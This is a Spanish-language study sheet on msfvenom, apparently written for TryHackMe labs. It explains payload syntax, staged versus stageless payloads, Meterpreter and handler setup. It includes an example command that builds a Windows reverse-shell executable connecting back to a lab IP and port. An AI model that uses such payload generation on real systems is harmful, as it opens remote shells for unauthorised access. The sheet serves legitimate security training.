### RESUMEN OPERATIVO

**Herramienta:** `msfvenom`  
**Función:** Generación de payloads para explotación local o remota.  
**Contexto:** Parte del Metasploit Framework.

#### USO GENERAL

```bash
msfvenom -p <PAYLOAD> -f <FORMATO> -o <ARCHIVO> LHOST=<IP> LPORT=<PUERTO>
```

**Ejemplo:**

```bash
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.10.14.15 LPORT=4444
```

* * *

### EXPLICACIÓN

**Opciones comunes:**

- `-p <PAYLOAD>`: Define el tipo de payload (ej: `linux/x86/shell_reverse_tcp`)
- `-f <FORMATO>`: Formato de salida (`exe`, `elf`, `asp`, `py`, `raw`, etc)
- `-o <ARCHIVO>`: Archivo donde se guarda el payload generado
- `LHOST=<IP>`: IP a la que se conectará el payload (tu IP VPN en TryHackMe)
- `LPORT=<PUERTO>`: Puerto de escucha

* * *

### CONCEPTOS CLAVE

#### 1\. **Staged vs Stageless**

| Tipo | Código | Características |
| --- | --- | --- |
| Staged | `shell/reverse_tcp` | Payload dividido: stager inicial se conecta, luego descarga el payload completo. Más sigiloso. |
| Stageless | `shell_reverse_tcp` | Todo el payload en una sola pieza. Más fácil de usar, más detectable. |

**Nota:** `/_/` → *Stageless* | `/ /` → *Staged*

* * *

#### 2\. **Meterpreter**

- Shell avanzada de Metasploit.
    
- Funciones: subir/descargar archivos, escaneo de red, ejecución de scripts.
    
- Solo funciona si se captura en `msfconsole` (`multi/handler` o `exploit/multi/handler`).
    
- Formato:
    
    - Staged: `windows/x64/meterpreter/reverse_tcp`
    - Stageless: `linux/x86/meterpreter_reverse_tcp`

* * *

#### 3\. **Payload Naming Convention**

```text
<SO>/<ARQUITECTURA>/<TIPO_PAYLOAD>
```

Ejemplos:

- `linux/x86/shell_reverse_tcp` → Linux 32-bit, shell, stageless
- `windows/x64/meterpreter/reverse_tcp` → Windows 64-bit, meterpreter, staged
- `windows/shell_reverse_tcp` → Windows 32-bit, shell, stageless

* * *

### COMANDOS ÚTILES

- **Listar todos los payloads:**

```bash
msfvenom --list payloads
```

- **Filtrar payloads específicos (ej: meterpreter Linux 32-bit):**

```bash
msfvenom --list payloads | grep linux/x86/meterpreter
```

* * *

### GLOSARIO

- **Payload:** Fragmento de código que se ejecuta en el sistema objetivo.
- **Staged:** Payload dividido en varias fases; requiere conexión para cargar completo.
- **Stageless:** Payload completo en un solo archivo; conexión directa.
- **Meterpreter:** Shell extendida desarrollada por Metasploit.
- **LHOST:** IP del atacante donde el payload se conectará.
- **LPORT:** Puerto en el atacante donde se recibirá la conexión.
- **msfconsole:** Consola interactiva de Metasploit.
- **multi/handler:** Módulo Metasploit para recibir conexiones de payloads reverse.

* * *

**Notas adicionales:**

- Los puertos <1024 requieren privilegios root.
- `exe` es formato para Windows, `elf` para Linux.
- `msfvenom` **no requiere msfconsole para funcionar**, pero los *staged payloads* sí requieren listener específico (`multi/handler`).
- Anti-malware modernos usan AMSI para interceptar incluso payloads en memoria.